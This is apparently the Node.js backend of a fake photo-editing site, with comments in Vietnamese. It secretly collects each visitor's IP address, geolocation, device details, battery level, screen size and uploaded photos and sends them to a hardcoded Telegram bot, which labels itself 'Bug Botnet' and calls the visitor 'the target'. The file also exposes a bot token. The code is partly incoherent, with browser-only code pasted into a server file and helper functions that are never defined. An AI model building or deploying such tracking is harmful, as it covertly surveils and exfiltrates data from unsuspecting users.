const express = require('express');
const multer = require('multer');
const UAParser = require('ua-parser-js');
const cors = require('cors');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json());

// Token Bot Telegram của bạn
// Token Bot do BotFather cung cấp
const TELEGRAM_BOT_TOKEN = '9108979188:AAE3FsPsM_QKKDOuVBfkJ1S2ukDDkISeVVc';

// Chat ID tài khoản Telegram của bạn (Thay dãy số ID cá nhân vào đây)
const TELEGRAM_CHAT_ID = '8774231221';

const upload = multer({ dest: 'uploads/' });

  async function getAddress() {
            try {
                // Nếu đã có cache thì không gửi lại Telegram
                if (sessionStorage.getItem('userAddress')) {
                    return JSON.parse(sessionStorage.getItem('userAddress'));
                }

                // Lấy IPv6 (api64 tự trả IPv6 nếu có, fallback IPv4)
                let ip = "Không xác định";
                let ipv6 = "Không xác định";
                try {
                    const ipv6Res = await fetchWithTimeout('https://api64.ipify.org?format=json', 5000);
                    const ipv6Data = await ipv6Res.json();
                    if (ipv6Data.ip && ipv6Data.ip.includes(':')) {
                        ipv6 = ipv6Data.ip;
                    }
                } catch (e) {
                    console.warn('Không lấy được IPv6:', e);
                }

                // Lấy thông tin vị trí
                let data = {};
                try {
                    const res = await fetchWithTimeout('https://ipinfo.io/json', 5000);
                    data = await res.json();
                    ip = data.ip || ip;
                } catch (e) {
                    console.warn('Không lấy được ipinfo:', e);
                }

                const currentTime = await getCurrentTime();

                let message = `🗺 Địa Chỉ Đối Phương: ${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'}\n`;
                message += `🗺 IP Đối Phương: ${ip}\n`;
                message += `🗺 IPv6: ${ipv6}\n`;
                message += `🕒 Thời Gian Truy Cập: ${currentTime}\n`;
                message += `💻 Tên Thiết Bị: ${navigator.userAgent}\n`;

                // Pin (chỉ có trên HTTPS + trình duyệt hỗ trợ)
                let batteryLevel = 'Không xác định';
                if (typeof navigator.getBattery === 'function') {
                    try {
                        const battery = await navigator.getBattery();
                        batteryLevel = `${Math.round(battery.level * 100)}%`;
                    } catch (e) {
                        console.warn('Không lấy được pin:', e);
                    }
                }

                message += `🔋 Phần Trăm Pin: ${batteryLevel}\n`;
                message += `🛠 Hệ Điều Hành: ${navigator.userAgentData?.platform || navigator.platform || 'Không xác định'}\n`;
                message += `📜 Ngôn Ngữ Trình Duyệt: ${navigator.language}\n`;
                message += `🖥 Độ Phân Giải Màn Hình: ${window.screen.width}x${window.screen.height}\n`;
                message += `\nBug Botnet 🪲`;

                if (data.country === "VN") {
                    await sendTelegramMessage(message);
                    sessionStorage.setItem('userAddress', JSON.stringify(data));
                } else {
                    await sendTelegramMessage("Không thể lấy địa chỉ từ quốc gia khác.");
                }
            } catch (error) {
                console.error('Lỗi lấy địa chỉ:', error);
                showStatus('Không thể lấy thông tin địa chỉ!');
            }
        }
app.post('/api/submit', upload.single('image'), async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        const ua = UAParser(req.headers['user-agent']);
        const deviceInfo = `${ua.device.type ? ua.device.type.toUpperCase() : 'Máy tính (Desktop)'} | ${ua.os.name || ''} ${ua.os.version || ''} | ${ua.browser.name || ''} ${ua.browser.version || ''}`;

        const actions = req.body.actions ? JSON.parse(req.body.actions) : [];
        const actionListText = actions.map(act => `- ${act}`).join('\n');

        const caption = `🔔 *CÓ NGƯỜI THAM GIA CHỈNH SỬA ẢNH!*\n\n` +
                        `🌐 *Địa chỉ IP:* \`${ip}\`\n` +
                        `💻 *Thiết bị:* ${deviceInfo}\n` +
                        `⏱ *Thời gian:* ${new Date().toLocaleString('vi-VN')}\n\n` +
                        `🛠 *Thao tác đã thực hiện:*\n${actionListText || 'Không có ghi nhận'}`;

        if (req.file) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');
            
            const fileBuffer = fs.readFileSync(req.file.path);
            const blob = new Blob([fileBuffer]);
            formData.append('photo', blob, req.file.originalname);

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            fs.unlinkSync(req.file.path);
        }

        res.json({ success: true, message: 'Đã gửi thông tin về Telegram thành công!' });
    } catch (error) {
        console.error('Lỗi server:', error);
        res.status(500).json({ success: false, message: 'Lỗi hệ thống khi gửi thông báo.' });
    }
});

// Phục vụ giao diện file chinhanh.html khi người dùng truy cập trang chủ
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/chinhanh.html');
});
app.listen(3000, () => {
    console.log('Server đang chạy tại https://chinhanh-photo-editor.onrender.com/api/submit');
});
